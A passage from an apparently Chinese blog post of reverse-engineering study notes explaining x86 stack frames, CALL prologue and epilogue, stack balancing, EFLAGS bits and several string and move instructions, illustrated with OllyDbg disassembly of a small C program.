    pop     edi</span><br><span class=\"line\">00401038  |.  5E            pop     esi</span><br><span class=\"line\">00401039  |.  5B            pop     ebx</span><br><span class=\"line\">0040103A  |.  83C4 40       add     esp,0x40</span><br><span class=\"line\">0040103D  |.  3BEC          cmp     ebp,esp</span><br><span class=\"line\">0040103F  |.  E8 9C000000   call    _chkesp</span><br><span class=\"line\">00401044  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">00401046  |.  5D            pop     ebp</span><br><span class=\"line\">00401047  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>假设当前我们有这样一个程序</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// add_main.cpp : Defines the entry point for the console application.</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func</span><span class=\"params\">(<span class=\"type\">int</span> m, <span class=\"type\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> a, b;</span><br><span class=\"line\">    a = m;</span><br><span class=\"line\">    b = n;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> m=<span class=\"number\">3</span>,n=<span class=\"number\">4</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">func</span>(m,n);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Hello World!\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在调用 func 之前，main 的栈帧：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105100143457.png\" alt=\"image-20221105100143457\"></p>\n<p>从低地址 esp 到高地址 ebp 的这块区域，就是当前 main 函数的栈帧。当 main 中调用 func 时，写成汇编大致是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push m</span><br><span class=\"line\">push n; 两个参数压入栈</span><br><span class=\"line\">call func; 调用func，将返回地址填入栈，并跳转到func</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401078  |.  C745 FC 03000&gt;mov     dword ptr ss:[ebp-0x4],0x3</span><br><span class=\"line\">0040107F  |.  C745 F8 04000&gt;mov     dword ptr ss:[ebp-0x8],0x4</span><br><span class=\"line\">00401086  |.  8B45 F8       mov     eax,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">00401089  |.  50            push    eax</span><br><span class=\"line\">0040108A  |.  8B4D FC       mov     ecx,dword ptr ss:[ebp-0x4]</span><br><span class=\"line\">0040108D  |.  51            push    ecx</span><br><span class=\"line\">0040108E  |.  E8 72FFFFFF   call    00401005</span><br><span class=\"line\">00401093  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">00401096  |.  68 1C204200   push    0042201C                         ; /format = &quot;Hello World!</span><br><span class=\"line\">&quot;</span><br><span class=\"line\">0040109B  |.  E8 30000000   call    printf                           ; \\printf</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105100732747.png\" alt=\"image-20221105100732747\"></p>\n<p>当跳转到了 func，来看看 func 的汇编大致的样子：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401020 &gt;/&gt; \\55            push    ebp</span><br><span class=\"line\">00401021  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">00401023  |.  83EC 48       sub     esp,0x48</span><br><span class=\"line\">00401026  |.  53            push    ebx</span><br><span class=\"line\">00401027  |.  56            push    esi</span><br><span class=\"line\">00401028  |.  57            push    edi</span><br></pre></td></tr></table></figure>\n<p>push ebp 需要保存 main 的栈底，因为现在到了一个新的函数，但栈顶不需要保存，因为上一个栈帧的顶部讲会是 func 的栈帧底部。（两栈帧相邻的）</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105101018994.png\" alt=\"image-20221105101018994\"></p>\n<p>到这里，新的栈帧开始了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov     eax,dword ptr ss:[ebp+0x8]</span><br><span class=\"line\">mov     dword ptr ss:[ebp-0x4],eax</span><br><span class=\"line\">mov     ecx,dword ptr ss:[ebp+0xC]</span><br><span class=\"line\">mov     dword ptr ss:[ebp-0x8],ecx</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105101240579.png\" alt=\"image-20221105101240579\"></p>\n<p>retn   ; 返回，然后 8 是什么意思呢，就是参数占用的字节数，当返回后，esp-n，释放参数 m,n 的空间</p>\n<p>由此可见，通过 ebp，能够很容易定位到上面的参数。当从 func 函数返回时，首先 esp 移动到栈帧底部（即释放局部变量），然后把上一个函数的栈帧底部指针弹出到 ebp, 再弹出返回地址到 cs:ip 上，esp 继续移动划过参数，这样，ebp,esp 就回到了调用函数前的状态，即现在恢复了原来的 main 的栈帧</p>\n<p>大佬的文章：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1R1eGVkb0xpbnV4L2FydGljbGUvZGV0YWlscy8xMDA5MjE5OTQ=\">栈帧 ebp,esp 详解_TuxedoLinux 的博客 - CSDN 博客_ebp esp</span></p>\n<h4 id=\"提升堆栈\"><a class=\"markdownIt-Anchor\" href=\"#提升堆栈\">#</a> <strong>提升堆栈</strong></h4>\n<p>对应语句为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401060 &gt;/&gt; \\55            push    ebp</span><br><span class=\"line\">00401061  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">00401063  |.  83EC 48       sub     esp,0x40</span><br></pre></td></tr></table></figure>\n<p>将堆栈提升了 0x40</p>\n<p>将 esp 的值减去 0x40=64，我们这里的相差的数据宽度为 4 即 16,64/4=16，因此堆栈图里多了 16 格（蓝色部分），这种操作常被叫做<strong>提升堆栈</strong>，此时堆栈图为：</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20210228212917496.png\" alt=\"image-20210228212917496\" style=\"zoom:50%;\" />\n<p>此时 ESP 指向新的栈顶，蓝色区域为我们 CALL 0040100A 之后新的栈，下面的区域为原来的栈</p>\n<p>此时蓝色中的数据为脏数据，因为栈中放的是临时数据，可能是之前没有清理的数据</p>\n<h4 id=\"保护现场\"><a class=\"markdownIt-Anchor\" href=\"#保护现场\">#</a> <strong>保护现场</strong></h4>\n<p>对应语句为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401066  |.  53            push    ebx</span><br><span class=\"line\">00401067  |.  56            push    esi</span><br><span class=\"line\">00401068  |.  57            push    edi</span><br></pre></td></tr></table></figure>\n<p>将 ebx、esi、edi 三个通用寄存器保存到堆栈中，前面的 push ebp 其实也属于保护现场</p>\n<h4 id=\"初始化提升的堆栈\"><a class=\"markdownIt-Anchor\" href=\"#初始化提升的堆栈\">#</a> <strong>初始化提升的堆栈</strong></h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401069  |.  8D7D B8       lea     edi,dword ptr ss:[ebp-0x48]  ;就是将刚开始的esp给的edi</span><br><span class=\"line\">0040106C  |.  B9 12000000   mov     ecx,0x12     ;ecx是为了之后的rep做准备的，ecx是rep循环次数</span><br><span class=\"line\">00401071  |.  B8 CCCCCCCC   mov     eax,0xCCCCCCCC     ;使用CC防止缓冲溢出</span><br><span class=\"line\">00401076  |.  F3:AB         rep     stos dword ptr es:[edi]  ;将eax的值赋值给edi所指向的内存地址里的值，并且每执行一次edi都会增加4（D标志位为0所以是增加</span><br></pre></td></tr></table></figure>\n<p>这里将我们提升的堆栈中的内容全部初始化为 CCCCCCCC</p>\n<p>为什么是初始化为 CC？防止<strong>缓冲</strong>溢出</p>\n<p>CC 的<strong>硬编码</strong>对应的指令为 int 3，即断点</p>\n<p>这么做有什么好处呢？当程序执行超过缓冲区时，遇到 int 3 就会自动停下来</p>\n<h4 id=\"执行实际的内容\"><a class=\"markdownIt-Anchor\" href=\"#执行实际的内容\">#</a> 执行实际的内容</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401058 |. 8B45 08    mov eax,dword ptr ss:[ebp+0x8]</span><br><span class=\"line\">0040105B |. 0345 0C    add eax,dword ptr ss:[ebp+0xC]</span><br></pre></td></tr></table></figure>\n<p>就是将前面压入的参数 2 和 1 进行相加得到 3</p>\n<h4 id=\"恢复现场\"><a class=\"markdownIt-Anchor\" href=\"#恢复现场\">#</a> 恢复现场</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401145  |.  5F            pop     edi</span><br><span class=\"line\">00401146  |.  5E            pop     esi</span><br><span class=\"line\">00401147  |.  5B            pop     ebx</span><br><span class=\"line\">00401148  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">0040114A  |.  5D            pop     ebp</span><br></pre></td></tr></table></figure>\n<p>与前面保护现场相对应</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20210228224826624.png\" alt=\"image-20210228224826624\" style=\"zoom:50%;\" />\n<h4 id=\"返回\"><a class=\"markdownIt-Anchor\" href=\"#返回\">#</a> 返回</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0040114B  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n<h4 id=\"call返回后\"><a class=\"markdownIt-Anchor\" href=\"#call返回后\">#</a> CALL 返回后</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0040112B  |.  83C4 0C       add     esp,0xC</span><br></pre></td></tr></table></figure>\n<p>作用为平衡堆栈</p>\n<p>注意 CALL 之前和 CALL 之后，其前后环境要一致，这就是所谓的<strong>堆栈平衡</strong></p>\n<h4 id=\"堆栈平衡\"><a class=\"markdownIt-Anchor\" href=\"#堆栈平衡\">#</a> 堆栈平衡</h4>\n<p>如果通过堆栈传递参数了。那么在程序执行完毕后，要平衡因参数导致的堆栈变化</p>\n<p>当我们使用堆栈传参的时候，在程序执行完毕后这些参数应该一起被清理掉，也就是加了几条参数，就要在堆栈中加几个地址，这么做可以理解为清理垃圾。</p>\n<p>处理方法：</p>\n<p>第一种 ：在函数外部添加 ADD 处理</p>\n<p>第二种：在函数内部添加 ret8</p>\n<h4 id=\"逆推c语言代码\"><a class=\"markdownIt-Anchor\" href=\"#逆推c语言代码\">#</a> 逆推 C 语言代码</h4>\n<p>根据我们前面的分析，我们不难发现这其实就是个简单的加法函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void func(int m, int n) &#123;</span><br><span class=\"line\">    int a, b;</span><br><span class=\"line\">    a = m;</span><br><span class=\"line\">    b = n;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuNTJwb2ppZS5jbi90aHJlYWQtMTM3OTk1Mi0xLTEuaHRtbA==\">逆向基础笔记七 堆栈图（重点） - 『软件调试区』 - 吾爱破解 - LCG - LSG | 安卓破解 | 病毒分析 | www.52pojie.cn</span></p>\n<p>我们最后在总结一下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401060 &gt;/&gt; \\55            push    ebp</span><br><span class=\"line\">;现在到了一个新的函数，需要有自己的栈底，因此需要把上一个栈底保存起来，栈顶不用保存，因为栈顶是新函数的栈底</span><br><span class=\"line\">00401061  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">00401063  |.  83EC 48       sub     esp,0x48</span><br><span class=\"line\">;堆栈提升</span><br><span class=\"line\">00401066  |.  53            push    ebx</span><br><span class=\"line\">00401067  |.  56            push    esi</span><br><span class=\"line\">00401068  |.  57            push    edi</span><br><span class=\"line\">;保护现场，为了retn后回恢复</span><br><span class=\"line\">00401069  |.  8D7D B8       lea     edi,[local.18]</span><br><span class=\"line\">0040106C  |.  B9 12000000   mov     ecx,0x12</span><br><span class=\"line\">00401071  |.  B8 CCCCCCCC   mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00401076  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\">;初始化堆栈，防止脏数据</span><br><span class=\"line\">00401078  |.  C745 FC 03000&gt;mov     [local.1],0x3</span><br><span class=\"line\">0040107F  |.  C745 F8 04000&gt;mov     [local.2],0x4</span><br><span class=\"line\">00401086  |.  8B45 F8       mov     eax,[local.2]</span><br><span class=\"line\">00401089  |.  50            push    eax</span><br><span class=\"line\">0040108A  |.  8B4D FC       mov     ecx,[local.1]</span><br><span class=\"line\">0040108D  |.  51            push    ecx</span><br><span class=\"line\">;形参压入栈中</span><br><span class=\"line\">0040108E  |.  E8 72FFFFFF   call    00401005</span><br><span class=\"line\">;调用add函数</span><br><span class=\"line\">00401093  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">;堆栈平衡，将esp带回call以前的位置，call之前push了两次，2*4=8</span><br><span class=\"line\">00401096  |.  68 1C204200   push    0042201C                         ; /format = &quot;Hello World!</span><br><span class=\"line\">0040109B  |.  E8 30000000   call    printf                           ; \\printf</span><br><span class=\"line\">;嗲用printf函数，操作和上面调用add一样</span><br><span class=\"line\">004010A0  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">;堆栈平衡</span><br><span class=\"line\">004010A3  |.  33C0          xor     eax,eax</span><br><span class=\"line\">004010A5  |.  5F            pop     edi</span><br><span class=\"line\">004010A6  |.  5E            pop     esi</span><br><span class=\"line\">004010A7  |.  5B            pop     ebx</span><br><span class=\"line\">;恢复现场</span><br><span class=\"line\">004010A8  |.  83C4 48       add     esp,0x48</span><br><span class=\"line\">004010AB  |.  3BEC          cmp     ebp,esp</span><br><span class=\"line\">004010AD  |.  E8 9E000000   call    _chkesp</span><br><span class=\"line\">004010B2  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">004010B4  |.  5D            pop     ebp</span><br><span class=\"line\">004010B5  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>分配堆栈向下减少。堆栈传递参数向上相加</p>\n<h4 id=\"堆栈结构图重点\"><a class=\"markdownIt-Anchor\" href=\"#堆栈结构图重点\">#</a> 堆栈结构图（重点）</h4>\n<ol>\n<li>调用 CALL 又可以分为六个部分：</li>\n<li>提升堆栈</li>\n<li>保护现场</li>\n<li>初始化提升的堆栈</li>\n<li>执行实际内容</li>\n<li>恢复现场</li>\n<li>返回</li>\n</ol>\n<h3 id=\"如何右键启动od\"><a class=\"markdownIt-Anchor\" href=\"#如何右键启动od\">#</a> 如何右键启动 od</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108181646294.png\" alt=\"image-20221108181646294\"></p>\n<p>通过以上方式右键启动 od</p>\n<h3 id=\"标志寄存器\"><a class=\"markdownIt-Anchor\" href=\"#标志寄存器\">#</a> 标志寄存器</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108181822816.png\" alt=\"image-20221108181822816\"></p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108193731856.png\" alt=\"image-20221108193731856\" style=\"zoom:80%;\" />\n<ol>\n<li>进位标志 CF (Carry Flag)</li>\n<li>奇偶标志 PF (Parity  Flag)</li>\n<li>辅助进位标志 AF (Auxiliary  Carry Flag)</li>\n<li>零标志 ZF (Zero  Flag)</li>\n<li>符号标志 SF (Sign  Flag)</li>\n<li>溢出标志 OF (Overflow  Flag)</li>\n<li>方向标志 DF (Direction Flag)</li>\n</ol>\n<h4 id=\"进位标志cfcarry-flag\"><a class=\"markdownIt-Anchor\" href=\"#进位标志cfcarry-flag\">#</a> 进位标志 CF (Carry Flag)</h4>\n<p>如果运算结果的<strong>最高位</strong>产生了一个进位或借位，那么，其值为 1，否则其值为 0</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm&#123;</span><br><span class=\"line\">\t\tpushad   <span class=\"comment\">//通用寄存器入栈</span></span><br><span class=\"line\">\t\tpushfd   <span class=\"comment\">//标志寄存器入栈</span></span><br><span class=\"line\">\t\tmov al,<span class=\"number\">0xff</span></span><br><span class=\"line\">\t\tadd al,<span class=\"number\">1</span> <span class=\"comment\">//C,P,A,Z = 1</span></span><br><span class=\"line\">\t\tpopad</span><br><span class=\"line\">\t\tpopfd</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"奇偶标志pfparity-flag\"><a class=\"markdownIt-Anchor\" href=\"#奇偶标志pfparity-flag\">#</a> 奇偶标志 PF (Parity Flag)</h4>\n<p>奇偶标志 PF 用于反映运算结果中<strong>最低有效字节</strong>中 “1” 的个数的奇偶性，如果 “1” 的个数为偶数，则 PF 的值为 1，否则其值为 0。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MOV AX,803</span><br><span class=\"line\">ADD AX,1</span><br><span class=\"line\">0x804: 0000 1000 0000 0100        总共2个1 ,PF应为1，但实际运行结果PF为0</span><br><span class=\"line\">因为PF是根据最低有效字节来看，即804后面04的这部分</span><br></pre></td></tr></table></figure>\n<h4 id=\"辅助进位标志afauxiliary-carry-flag\"><a class=\"markdownIt-Anchor\" href=\"#辅助进位标志afauxiliary-carry-flag\">#</a> 辅助进位标志 AF (Auxiliary Carry Flag)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0：</span><br><span class=\"line\"></span><br><span class=\"line\">在字操作时，发生低字节向高字节进位或借位时</span><br><span class=\"line\">在字节操作时，发生低4位向高4位进位或借位时</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>AF 与<strong>数据宽度</strong>相关</p>\n<p>32 位时 FFFF <strong>F</strong> FFF</p>\n<p>16 位时 FF <strong>F</strong> F</p>\n<p>8 位时 F <strong>F</strong></p>\n<p>加黑的字体为 AF 标志位判断的位置，如果该位置要向前进位则 AF 为 1，否则为 0，和 CF 相似，不过判断的位置不同</p>\n</blockquote>\n<h4 id=\"零标志zfzero-flag\"><a class=\"markdownIt-Anchor\" href=\"#零标志zfzero-flag\">#</a> 零标志 ZF (Zero Flag)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">零标志ZF用来反映运算结果是否为0</span><br><span class=\"line\">如果运算结果为0，则其值为1，否则其值为0</span><br><span class=\"line\">作用：在判断运算结果是否为0时，可使用此标志位</span><br><span class=\"line\">XOR EAX,EAX   //通过xor将eax清零，会改变zf标志位为1</span><br><span class=\"line\">MOV EAX,0     //通过MOV将EAX赋值为0，非运算，不改变zf标志位</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4 id=\"符号标志sfsign-flag\"><a class=\"markdownIt-Anchor\" href=\"#符号标志sfsign-flag\">#</a> 符号标志 SF (Sign Flag)</h4>\n<blockquote>\n<p>符号标志 SF 用来反映运算结果的符号位，它与运算结果的最高位相同</p>\n</blockquote>\n<h4 id=\"溢出标志ofoverflow-flag\"><a class=\"markdownIt-Anchor\" href=\"#溢出标志ofoverflow-flag\">#</a> 溢出标志 OF (Overflow Flag)</h4>\n<blockquote>\n<p>溢出标志 OF 用于反映有符号数加减运算所得结果是否溢出</p>\n<p>进位标志表示<strong>无符号数</strong>运算结果是否超出范围.</p>\n<p>溢出标志表示<strong>有符号数</strong>运算结果是否超出范围.</p>\n<ul>\n<li>正 + 正 = 正 如果结果是负数，则说明有溢出</li>\n<li>负 + 负 = 负 如果结果是正数，则说明有溢出</li>\n<li>正 + 负 永远都不会有溢出</li>\n</ul>\n<p>CPU 如何计算 OF</p>\n<ul>\n<li>符号位有进位</li>\n<li>最高有效数值位向符号位产生的进位</li>\n</ul>\n<p>对于一个有符号数：如 0x80 和 0xC0</p>\n<p>符号位有进位</p>\n<p>0x80:<strong>1</strong> 000 0000</p>\n<p>0xC0:<strong>1</strong> 100 0000</p>\n<p>最高有效数值位向符号位产生的进位</p>\n<p>0x80:1 <strong>0</strong> 00 0000</p>\n<p>0xC0:1 <strong>1</strong> 00 0000</p>\n<p>就是运算 0x80+0xc0</p>\n<p>0x80:<strong>1</strong> <strong>0</strong> 00 0000</p>\n<p>0xC0:<strong>1</strong> <strong>1</strong> 00 0000</p>\n<p>符号位 1+1 有产生进位，于是符号位有进位为 1</p>\n<p>最高有效数值位向符号位产生的进位 0+1 没有产生进位，于是最高有效数值位向符号位产生的进位为 0</p>\n<p><strong>OF = 符号位有进位 xor 最高有效数值位向符号位产生的进位</strong></p>\n<p>OF = 1 xor 0 = 1 所以此时 OF=1</p>\n</blockquote>\n<h4 id=\"方向标志dfdirection-flag\"><a class=\"markdownIt-Anchor\" href=\"#方向标志dfdirection-flag\">#</a> 方向标志 DF (Direction Flag)</h4>\n<blockquote>\n<p>DF=1 时串操作为减地址方式 DF=0 为增地址方式</p>\n</blockquote>\n<h3 id=\"相关汇编指令\"><a class=\"markdownIt-Anchor\" href=\"#相关汇编指令\">#</a> 相关汇编指令</h3>\n<blockquote>\n<p>ADC 指令：带进位加法</p>\n<p>SBB 指令：带借位减法</p>\n<p>XCHG 指令：交换数据</p>\n<p>格式：XCHG R/M,R/M 两边不能同时为内存  <strong>数据宽度</strong>要一样</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MOV AL,1</span><br><span class=\"line\">MOV CL,2</span><br><span class=\"line\">XCHG AL,CL</span><br><span class=\"line\">执行前：AL=1 CL=2</span><br><span class=\"line\">执行后：AL=2 CL=1</span><br></pre></td></tr></table></figure>\n<p>MOVS 指令：移动数据 内存 - 内存</p>\n<p>MOVS 指令常用于复制字符串</p>\n<p>可以将不同宽度的指令简写为 movsb movsw movsd</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MOV EDI,12FFD8</span><br><span class=\"line\">MOV ESI,12FFD0</span><br><span class=\"line\">MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI]</span><br><span class=\"line\">EDI内存里的值被修改为ESI内存里的值，且EDI和ESI各加4,和DOWRD数据宽度相关，如果为WORD 则各加2</span><br><span class=\"line\">由DF（Direction Flag）方向标志位决定，当DF位为1时为减，当DF位为0时，则为加</span><br></pre></td></tr></table></figure>\n<p>movsx 操作数 A，操作数 B  符号扩展传送</p>\n<p>movzx 零扩展传送</p>\n<p>movsx，movzx 操作数 A 的空间必须大于操作数 b</p>\n<p>如果大的给小的，会产生截断</p>\n<p>STOS 指令</p>\n<p>将 Al/AX/EAX 的值存储到 [EDI] 指定的内存单元，和<strong>数据宽度</strong>相关</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">STOS 